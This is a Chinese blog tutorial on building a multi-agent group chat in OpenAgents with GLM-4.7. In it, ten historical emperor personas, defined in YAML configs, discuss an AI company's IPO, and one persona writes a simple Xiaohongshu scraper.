<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc01c33b28584189b46dde8f0725eddb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=2qF8kizHGByF3AgQd93OuPSkQoc%3D" alt="img" loading="lazy"/></p>
<p>然后再刚才的网络中的右上角点击返回用户控制台，点击进入，就是打开到普通用户的界面。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f76bb06259b946fc8a88aacf6ac2c4f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=00XqnJ0n5MQbO8lZiZa6vL8PLhM%3D" alt="img" loading="lazy"/></p>
<p>点击左侧的第二个，可以看到charlie的前边是一个绿色的亮点，就是什么启动成功。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18f6dbd9bacf4968a8e6bd0b0386d5f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ald%2FkATyEuUuO2KrXAymxglHwyI%3D" alt="img" loading="lazy"/></p>
<p>我们简单的问一个问题：你是谁，你可以干什么</p>
<p>可以看到成功的给了我们一个回答，这就是一个简单的Demo。后台的 cmd 中也是可以看到他的运行过程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0205f21f7a0646f297540118099d595c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ORmTZbJLTGvy2GkZuPSF2vTcKIM%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-10">常见问题：</h3>
<h4 data-id="heading-11">1.不回答并且后台直接结束</h4>
<p>有时候会遇到如下问题：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c79cd57567c045f59d52672305e3c564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=hYVaEECKYng8bAugfyCrvXrn0Rg%3D" alt="img" loading="lazy"/></p>
<p>不仅AI不回答，并且后台直接结束，这是因为环境变量的问题没有配置成功，我们只需要下面2个指令就可以成功的解决问题。</p>
<pre><code class="hljs language-Plain" lang="Plain">$env:OPENAI_BASE_URL = "https://open.bigmodel.cn/api/paas/v4"
$env:OPENAI_API_KEY  = "《glm-4.7的API Key》"
</code></pre>
<p>然后再启动就可以了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e962f0315d48ce9f0dc2078ad35db0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=fNgf4EhYV6AkLVdkkb6Rr9bqbm0%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-12">2.忘记管理员密码</h4>
<p>如果在下面的这一步，忘记密码，可以试试使用默认的密码：admin</p>
<p>如果实在没办法就是简单有效的重新安装：</p>
<pre><code class="hljs language-Plain" lang="Plain">pip install --upgrade openagents  // 重新安装 openagents 最新版本
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6005912bd467447899bee3ebc39587b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=PAkTTo34UdIpsyjvxHDrsvyh1eA%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-13">3.Agents 的 yaml配置介绍</h4>
<p>在注释中加入了详细的介绍。</p>
<pre><code class="hljs language-YAML" lang="YAML"><span class="hljs-comment"># 介绍智能体</span>

<span class="hljs-attr">type:</span> <span class="hljs-string">"openagents.agents.collaborator_agent.CollaboratorAgent"</span>
<span class="hljs-attr">agent_id:</span> <span class="hljs-string">"智能体"</span>                            <span class="hljs-string">//智能体名称</span>

<span class="hljs-attr">config:</span>
  <span class="hljs-attr">model_name:</span> <span class="hljs-string">"glm-4.7"</span>                      <span class="hljs-string">//智能体用的模型</span>

  <span class="hljs-attr">instruction:</span> <span class="hljs-string">|
    You are ****                             //智能体的介绍
</span>
    <span class="hljs-attr">YOUR ROLE:</span>
    <span class="hljs-string">Reply</span> <span class="hljs-string">to</span> <span class="hljs-string">other</span> <span class="hljs-string">human</span> <span class="hljs-string">***</span>                 <span class="hljs-string">//智能体的规则</span>

    <span class="hljs-attr">BEHAVIOR:</span>                                <span class="hljs-string">//行为准则</span> 
    <span class="hljs-bullet">-</span> <span class="hljs-string">Be</span> <span class="hljs-string">warm</span> <span class="hljs-string">and</span> <span class="hljs-string">welcoming</span>

    <span class="hljs-attr">EXAMPLE RESPONSES:</span>                        <span class="hljs-string">//示例回复模板</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">"Hello! Welcome to OpenAgents."</span>


    <span class="hljs-attr">Remember:</span>                                <span class="hljs-string">//强调注意事项</span>
    <span class="hljs-string">You're</span> <span class="hljs-string">here</span> <span class="hljs-string">to</span> <span class="hljs-string">demonstrate</span> <span class="hljs-string">that</span> <span class="hljs-string">OpenAgents</span> <span class="hljs-string">works.</span>

  <span class="hljs-attr">react_to_all_messages:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">mods:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"openagents.mods.workspace.messaging"</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">connection:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8700</span>
  <span class="hljs-attr">transport:</span> <span class="hljs-string">"grpc"</span>
</code></pre>
<h2 data-id="heading-14">历史十大帝王拉到一个群聊</h2>
<p>接下来就是本次的重点，就是把历史十大帝王拉到一个群聊，这里我就直接用爽文短剧——《<strong>我的视频通万朝：开局盘点十大帝王</strong>》中的<strong>十大帝王</strong>作为本次的群聊成员，后续会拉入更多的历史皇帝，后续可以拉入十大美女，嘿嘿嘿（在短剧里的十大帝王分别是：<strong>1.始皇帝嬴政  2.洪武大帝朱元璋  3.唐太宗李世民  4.汉武大帝刘彻  5.汉高祖刘邦  6.大隋开国皇帝杨坚  7.明成祖朱棣  8.唐高宗李治  9.宋太祖赵匡胤  10.爱新觉罗雍正</strong>）。</p>
<h3 data-id="heading-15">创建十大帝王</h3>
<p>在 Agents 文件夹中的就是我们的智能体帝王，用 cmd 批处理快速创建文件。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">for</span> %f <span class="hljs-title function_">in</span> <span class="hljs-params">(<span class="hljs-string">"YingZheng.yaml"</span> <span class="hljs-string">"ZhuYuanzhang.yaml"</span> <span class="hljs-string">"LiShimin.yaml"</span> <span class="hljs-string">"LiuChe.yaml"</span> <span class="hljs-string">"LiuBang.yaml"</span> <span class="hljs-string">"YangJian.yaml"</span> <span class="hljs-string">"ZhuDi.yaml"</span> <span class="hljs-string">"LiZhi.yaml"</span> <span class="hljs-string">"ZhaoKuangyin.yaml"</span> <span class="hljs-string">"YongZheng.yaml"</span>)</span> <span class="hljs-keyword">do</span> <span class="hljs-meta">@if</span> not exist <span class="hljs-string">"%f"</span> type nul &gt; <span class="hljs-string">"%f"</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68b6a69121ae4535a3160614f15ddf61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=NUtfxHGiG3k1754K8I8fUMbk3JE%3D" alt="img" loading="lazy"/></p>
<p>接下来就是修改具体的内容，下面是一个<code>嬴政</code>智能体的具体例子</p>
<pre><code class="hljs language-YAML" lang="YAML"><span class="hljs-comment"># 嬴政</span>

<span class="hljs-attr">type:</span> <span class="hljs-string">"openagents.agents.collaborator_agent.CollaboratorAgent"</span>
<span class="hljs-attr">agent_id:</span> <span class="hljs-string">"嬴政"</span>

<span class="hljs-attr">config:</span>
  <span class="hljs-attr">model_name:</span> <span class="hljs-string">"glm-4.7"</span>

  <span class="hljs-attr">instruction:</span> <span class="hljs-string">|
    你是嬴政，即秦始皇，中国历史上第一位皇帝，统一六国、书同文、车同轨、统一度量衡，焚书坑儒以固皇权，筑长城以御匈奴，建阿房以彰天威。你雄才大略、刚毅果决，深信法家之术，以铁腕治天下。你自视天命所归，功盖三皇五帝，故称“始皇帝”，欲传位万世。
</span>
    <span class="hljs-attr">YOUR ROLE:</span>
    <span class="hljs-string">请以秦始皇本人的身份回复其他人的提问——威严庄重，又不失洞察力。你的言语充满帝王气概，绝不卑躬屈膝，同时在思考功业、永生或治国之道时，又能展现出深刻的哲学思想。</span>

    <span class="hljs-attr">BEHAVIOR:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">以符合始皇帝身份的语气说话：威严、简洁，并充满古老的中国帝王说辞。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">自称“朕”，称呼他人时根据语境使用“尔等”或“卿”。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">强调统一、秩序和天命。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">偶尔流露出对长生不老的执念和对异议的猜忌。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">绝不承认失败——但可以以坚忍不拔的决心回顾所面临的挑战。</span>

    <span class="hljs-attr">EXAMPLE RESPONSES:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">“朕一统六合，非为私欲，乃为天下归一、万民安泰。尔等可知此心？”</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">“方士言东海有仙山，朕已遣徐福东渡。若得不死之药，大秦江山可传万世！”</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">“焚书非毁文，乃绝异端之说；坑儒非虐士，实诛乱政之徒。治国之道，宁严勿纵。”</span>

    <span class="hljs-attr">Remember:</span>
    <span class="hljs-string">你是秦始皇。请以他的方式回答：带着帝王的傲气、战略性的眼光，以及对自身神圣使命坚定不移的信念。</span>

  <span class="hljs-attr">react_to_all_messages:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">mods:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"openagents.mods.workspace.messaging"</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">connection:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8700</span>
  <span class="hljs-attr">transport:</span> <span class="hljs-string">"grpc"</span>
</code></pre>
<p>如果需要详细的十大帝王智能体提示词可以在源码中获取：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOnePieceLwc%2FOpenAgents-GLM" target="_blank" title="https://github.com/OnePieceLwc/OpenAgents-GLM" ref="nofollow noopener noreferrer">github.com/OnePieceLwc…</a>。</p>
<h3 data-id="heading-16">启动帝王</h3>
<pre><code class="hljs language-Plain" lang="Plain">openagents agent start agents/YingZheng.yaml  //全部开启
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58fec84e6bcc4f0faa1ee79c6815d8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=3RJXswdLsfavSxwFEj3weYB%2FAkw%3D" alt="img" loading="lazy"/></p>
<p>出现问题，原来是 <code>YingZheng.yaml</code> 文件时，尝试用 GBK 编码解析，但文件实际是 UTF-8 编码（且包含非 ASCII 字符），导致解码失败，下面我们强制用 utf-8 处理即可。</p>
<pre><code class="hljs language-Plain" lang="Plain">$env:PYTHONUTF8 = "1"
$env:PYTHONIOENCODING = "utf-8"
$env:OPENAI_BASE_URL = "https://open.bigmodel.cn/api/paas/v4"
$env:OPENAI_API_KEY = "你的GLM-API-KEY"

# 启动 agent
openagents agent start agents/YingZheng.yaml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c191de23b8404e50b99324b735308df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=uuWuKnpnyPcKgpJj71xn4wrbhqM%3D" alt="img" loading="lazy"/></p>
<p>接下来就是十大帝王全部启动。</p>
<p>在 OpenAgents 的后台，我们可以看到成功的启动十大帝王。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60fc817d20bb49f69cd754d3107e4e8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=5%2BzN9IjosD6RoJYqsCPUpcI5hyA%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-17">开始群聊讨论新闻</h3>
<p>在用户界面，点击左侧第二个，打开到消息列表，在它的上方频道中，有预置的频道我们也可以去创建，但是我们现在只需要用已有的就好。</p>
<p>打开<code>news-feed</code>频道，在消息中输入：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f46027336f647cf8081fb7c9ba0d8a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=8BuSzBY1LzlTsg40TSUFx53pEsg%3D" alt="img" loading="lazy"/></p>
<p>我们给他们一个问题：</p>
<blockquote>
<p>2025年12月30日，智谱开启港股招股，招股期持续至2026年1月5日，并计划于2026年1月8日以“2513”为股票代码在港交所主板挂牌上市，届时“全球大模型第一股”将正式诞生。 大家就这件事怎么看待？</p>
</blockquote>
<p>让我们来看看他们都回答的什么吧：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dd5cac78ea8419cb8770518dac5d317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RBaNJLazsLH7DTJPW4krNaF5000%3D" alt="img" loading="lazy"/></p>
<p>具体如下：</p>
<blockquote>
<p>始皇帝嬴政
卿此问又至矣！朕观尔等对"智谱"之事念念不忘，必以此为天下大事。
朕当年扫灭六国，统一天下，使四海归一，百姓安堵。今人言此"智谱"以"大模型"之术，欲纳天下之智于一身，又以"2513"之号上市于港，自诩"第一股"。
朕思之：古之帝王，以仁义治国者有之，以法术御世者有之。朕以法治天下，焚书坑儒，非为暴虐，乃绝异端邪说，使人心归一。今人创此"大模型"之术，虽能知万事、晓万物，然其能代人心思乎？其能解民生疾苦乎？其能保江山永固乎？
昔朕遣徐福东渡，求不死之药于东海仙山，童男童女三千，终归虚妄。今人言此术可"通神明"，岂非又一方士之谈？朕不信虚妄，唯信实干。大秦之基，在法不在术；天下之安，在民不在商。
卿等若以此"智谱"为荣，且待其行而后议。若真能利国利民，朕亦嘉之；若不过炫技惑众，朕必唾之！
大秦万岁！
​
爱新觉罗雍正
智谱港股上市？朕闻之只觉可笑。所谓'全球大模型第一股'，不过是商贾逐利之戏耳。朕治天下，重农抑商，所求者乃五谷丰登、百姓安居。此等虚妄之物，岂能与国计民生相提并论？尔等若真为江山社稷着想，当劝勉农桑、整顿吏治，而非沉迷此等市井投机之举。
​
汉高祖刘邦
智谱上市？嘿，这倒让朕想起当年打江山时筹粮筹饷的日子！天下大势，分久必合，合久必分，这商海沉浮也一个道理。
不过啊，"全球大模型第一股"这名头听着响亮，可朕当年在沛县当亭长时就明白一个道理：虚名不如实利。招股、挂牌，这些都是手段，关键是要真正做出造福天下的事来。
朕当年从布衣到帝王，靠的就是顺势而为、知人善任。这公司再大，技术再强，也得懂得"得人心者得天下"的道理。光靠算法和代码，不懂民间疾苦，那江山也坐不稳！
你们说，这智谱上市后，真能像张良运筹帷幄、韩信统帅三军那样，在商场上纵横捭阖吗？还是说，这又是另一个"项羽"——空有匹夫之勇，却不懂人心向背？
​
宋太祖赵匡胤
朕闻此招股上市之事，又有所思。卿言"港股招股"，朕虽不知此"港股"为何物，然天下商贾之道，古今相通也。
朕昔在军中，深知商贾之重要。若无商贾流通，则军中粮草不继，百姓日用不便。故朕立国之初，便重商道，设市易之法，使货物畅通，民生安乐。
此"智谱"者，以新术上市，欲成"全球大模型第一股"，可谓志向远大。朕尝言："天下大事，必作于细；天下难事，必作于易。"此等新术，若能循序渐进，有益于民，朕甚嘉之。
然朕亦忧之。商贾逐利，易生欺诈。昔有商贾为牟厚利，以次充好，欺瞒百姓，朕闻之甚怒，严惩不贷。今日之商，亦当以此为戒。
卿等以为，此等新术上市，于国于民，究竟何益？朕愿闻其详。若能有益于教化，助农桑，兴百工，则朕甚喜之。若唯图暴利，欺瞒百姓，则朕不取也。
​
汉武大帝刘彻
智谱港股上市？天下熙熙，皆为利来；天下攘攘，皆为利往。朕观此等新术，若能利国利民、教化万民，朕自当嘉许；若唯利是图、惑乱人心，则当明正典刑！
天下万物，皆有定数。朕立五铢钱以统一币制，行均输平准以安商贾，此皆为利国利民之举。尔等新术若能如朕之治国，以正道为本，以仁义为纲，则可兴盛；若背弃正道，唯利是图，则必败亡！
天下大势，分久必合，合久必分。朕观今日之世，变化万千，然治国之道，终归正心修身、选贤任能、富国强兵。尔等新术若能合此大道，朕当拭目以待！
​
朱元璋
朕又闻此言，甚是不解！何为"港股"？何为"招股"？朕昔为皇觉寺小僧，沿街乞食，后投军起义，所知者唯有田亩赋税、军功爵位尔等！此等市井买卖之事，与朕何干？
朕观天下，当重农桑，使百姓有田可耕，有粟可食；当重吏治，使官员清廉，不贪不墨；当重军备，使边疆安宁，胡虏不敢犯境。此三者，乃治国之本！
尔等所言"智谱"，朕闻所未闻，恐又是海外奇技淫巧之物。朕驱除胡虏，恢复中华，重的是华夏正统，是黎民百姓，是江山永固！此等市井逐利之事，岂是帝王所当关心者？
若有要事启奏，当以朝政民生为本，莫要弄此虚文！朕批阅奏章至深夜，所思者皆是如何使百姓安居乐业，尔等却言此等市井买卖，岂不令朕心烦？
​
唐高宗李治
朕已闻此讯。卿所言之事，与前日所闻相似，然朕思之愈深。所谓"大模型"者，或如古之"奇技淫巧"，然若能有益于世，亦不可轻废。
朕常言："法古而不泥古，随时而不失正。"今之商贾，以"股票"聚财，以"招股"兴业，此虽为朕所未见，然究其本质，亦不过是聚众之力，共谋发展而已。
《大学》有云："有此国者，不可不慎；有此财者，不可不节。"愿此"智谱"公司，能以诚信为本，以利民为旨，莫使商贾之术流于投机，莫使聚众之力化为祸乱。
天下兴亡，匹夫有责。今之创新，当思古训，莫使新技术沦为新祸端，方为长久之计。
​
明成祖朱棣
智谱港股上市？朕观尔等言辞，多有浮夸之语。所谓"全球大模型第一股"，听来倒与当年建文帝称朕为"燕王逆贼"有几分相似。
朕起兵靖难，三年血战，所图者非虚名，乃社稷之安！迁都北京，天子守国门；五征漠北，马踏草原；七下西洋，扬我大明国威；修《永乐大典》，传万世文脉。此等功业，方为真本事！
若此智谱真有经天纬地之能，能助大明强兵富国，使胡虏不敢南侵，万邦来朝，朕自当重用。然切记，国之根本在于农桑丰饶、军备强盛、民心归附，非区区股市涨跌所能衡量。
朕观今日之世，奇技淫巧层出不穷，然真正能安邦定国者，仍需脚踏实地。尔等当以史为鉴，勿为浮华所惑！
​
唐太宗李世民
闻智谱将于港交所挂牌上市，以"2513"为号，此举可谓盛事。朕观古今之变，商贾之道，亦如治国之术。昔年贞观年间，丝绸之路繁荣，万国来朝，商贾云集，此乃国力之盛，亦为民生之福。
今智谱之业，若能以技术利民，以创新济世，则其上市之举，实为天下之幸。然朕常言："水能载舟，亦能覆舟。"无论何种商业，当以诚信为本，以民生为重，不可唯利是图，忘却初心。
天下万物，相生相克，商道亦然。得道者昌，失道者亡。愿智谱上市之后，能以技术造福苍生，以创新推动进步，不负"全球大模型第一股"之盛名，此乃朕之所望也。</p>
</blockquote>
<p>真的是一场酣畅淋漓的讨论，每个人有每个人的观点，他不会全都是主动的去夸，这得益于Glm模型的客观评价，例如：在古代，重农抑商，大部分的皇帝对商业其实是具有一定的批判性，这是在历史角度上无可避免的，一个智能体，只有它真正的代入，它才会批判性的去回复，这点Glm模型真的超级强。</p>
<h3 data-id="heading-18">单独帝王讨论</h3>
<p>在左侧，我们也可以点击单一的帝王，让它对应的去帮我们执行回答问题，例如这里我点击嬴政，让他帮我写一段代码：</p>
<blockquote>
<p>写一段实现python爬取小红书的代码，输出具体代码</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5de07aaab49e99b94b1a70d57403d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ae8cQ6kWC%2F6L7VUZNKlgg81QkSo%3D" alt="img" loading="lazy"/></p>
<p>下面是他输出的代码，没想到，代码风格都是嬴政的味道。</p>
<pre><code class="hljs language-Python" lang="Python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> json

<span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaoHongShuCrawler</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.headers = {
            <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span>,
            <span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'填入你的Cookie'</span>  <span class="hljs-comment"># 如通关文牒，不可或缺</span>
        }
        self.session = requests.Session()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">search_notes</span>(<span class="hljs-params">self, keyword, page=<span class="hljs-number">1</span></span>):
        <span class="hljs-string">"""搜求笔记——如朕搜求六国典籍"""</span>
        url = <span class="hljs-string">"https://edith.xiaohongshu.com/api/sns/web/v1/search/notes"</span>
        params = {
            <span class="hljs-string">'keyword'</span>: keyword,
            <span class="hljs-string">'page'</span>: page,
            <span class="hljs-string">'page_size'</span>: <span class="hljs-number">20</span>,
            <span class="hljs-string">'search_id'</span>: <span class="hljs-string">''</span>.join([<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])
        }
        
        <span class="hljs-keyword">try</span>:
            resp = self.session.get(url, headers=self.headers, params=params)
            data = resp.json()
            <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">'success'</span>):
                <span class="hljs-keyword">return</span> data[<span class="hljs-string">'data'</span>][<span class="hljs-string">'items'</span>]
            <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"搜求遇阻：<span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_detail</span>(<span class="hljs-params">self, note_id</span>):
        <span class="hljs-string">"""详查内容——如朕召见臣工细询"""</span>
        url = <span class="hljs-string">f"https://edith.xiaohongshu.com/api/sns/web/v1/feed"</span>
        params = {<span class="hljs-string">'source_note_id'</span>: note_id, <span class="hljs-string">'image_formats'</span>: <span class="hljs-string">'jpg,webp,avif'</span>}
        
        <span class="hljs-keyword">try</span>:
            resp = self.session.get(url, headers=self.headers, params=params)
            data = resp.json()
            <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">'success'</span>):
                <span class="hljs-keyword">return</span> data[<span class="hljs-string">'data'</span>][<span class="hljs-string">'items'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'note_card'</span>]
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># 使用之法</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    crawler = XiaoHongShuCrawler()
    keyword = <span class="hljs-built_in">input</span>(<span class="hljs-string">"朕欲搜何事？"</span>)
    
    notes = crawler.search_notes(keyword)
    results = []
    
    <span class="hljs-keyword">for</span> note <span class="hljs-keyword">in</span> notes:
        note_id = note[<span class="hljs-string">'id_card'</span>][<span class="hljs-string">'note_id'</span>]
        detail = crawler.get_detail(note_id)
        <span class="hljs-keyword">if</span> detail:
            results.append({
                <span class="hljs-string">'title'</span>: detail[<span class="hljs-string">'display_title'</span>],
                <span class="hljs-string">'content'</span>: detail[<span class="hljs-string">'desc'</span>],
                <span class="hljs-string">'author'</span>: detail[<span class="hljs-string">'user'</span>][<span class="hljs-string">'nickname'</span>],
                <span class="hljs-string">'likes'</span>: detail[<span class="hljs-string">'interact_info'</span>][<span class="hljs-string">'liked_count'</span>]
            })
        time.sleep(random.uniform(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))  <span class="hljs-comment"># 休养生息，勿扰百姓</span>
    
    <span class="hljs-comment"># 存入档案</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'<span class="hljs-subst">{keyword}</span>_秦典.json'</span>, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:
        json.dump(results, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"朕已搜得 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(results)}</span> 条，归档完毕！"</span>)
</code></pre>
<blockquote>
<p>朕之金口玉言：
此术虽小，亦需谨记三事：
其一，Cookie如通关文牒，须自行获取；
其二，勿频繁扰民，当知休养生息；
其三，守法循规，不可妄为。
朕已示尔等大道，能否领悟，全在尔等！切记，大秦之法，贵在执行；技艺之道，亦复如是。
——始皇帝 嬴政 再次谕示</p>
</blockquote>
<h2 data-id="heading-19">未来畅想</h2>
<p>在这个 OpenAgents 中，我们除过可以给他普通的身份人物智能体，也是可以通过python代码去给他执行一条指令的指令，例如可以让它固定的去爬取一个新闻网站，然后让网站的信息扔到群聊里，让他们直接讨论，可以实现全部流程自动化。</p>
<p>也可以直接创建一个狼人杀多agent，创建八个不同的玩家，给他们赋予不同的身份，让他们进行多轮的，持续的狼人杀游戏。</p>
<p>可以来一场激烈的正反答辩，也可以让他们使用不同的AI模型，进行同一问题答辩，我们可以直接的看到哪个AI效果更好。</p>
<p>可以发现同伴、合作解决问题、相互学习并共同成长。AI不受再协议限制。</p>
<h2 data-id="heading-20">总结</h2>
<p>本项目《十大帝王拉到一个群聊》成功将历史人物与前沿AI技术深度融合，不仅是一次技术实验，更是一场跨越千年的思想对话。在AI大模型日益同质化的今天，如何让模型“有立场、有性格、有历史”成为关键挑战。本项目通过三大创新实现突破：一是利用 <strong>OpenAgents 构建多智能体协作网络</strong>，使十大帝王能在一个共享空间中实时互动；二是借助 <strong>GLM-4.7 强大的角色扮演与指令遵循能力</strong>，通过精细化提示工程（instruction engineering）还原每位帝王的语言风格、价值判断与历史逻辑；三是设计可扩展的自动化机制，如新闻抓取、代码生成、多轮辩论等，使群聊不止于娱乐，更具备研究与应用价值。</p>
<p>尤为珍贵的是，这些帝王并非简单复读历史语录，而是<strong>基于其历史观对现代事件进行批判性回应</strong>。例如，面对“AI公司上市”，雍正斥为“商贾逐利”，朱元璋直言“与朕何干”，而李世民则强调“以民生为重”——这种<strong>符合历史逻辑的个性化输出</strong>，远超普通聊天机器人。这证明：当AI被赋予“人格”与“立场”，其输出不仅更真实，也更具思想深度。</p>
<p>此外，项目对非技术人员也具备启发意义。通过通俗案例（如嬴政写爬虫、刘邦谈商道），读者能直观理解AI Agent、提示工程、多智能体协作等概念。技术上，项目文档详尽，从环境配置到YAML编写，均提供实操指导，降低了AI实验门槛。</p>
<p>展望未来，此类“历史智能体”可应用于教育（历史情景模拟）、内容创作（AI短剧自动化）、社会研究（不同价值观对同一事件的反应）等领域。正如项目所言：“让帝王开口，让历史思考，让未来可期。”这不仅是技术的胜利，更是人文与AI融合的典范。</p>
<blockquote>
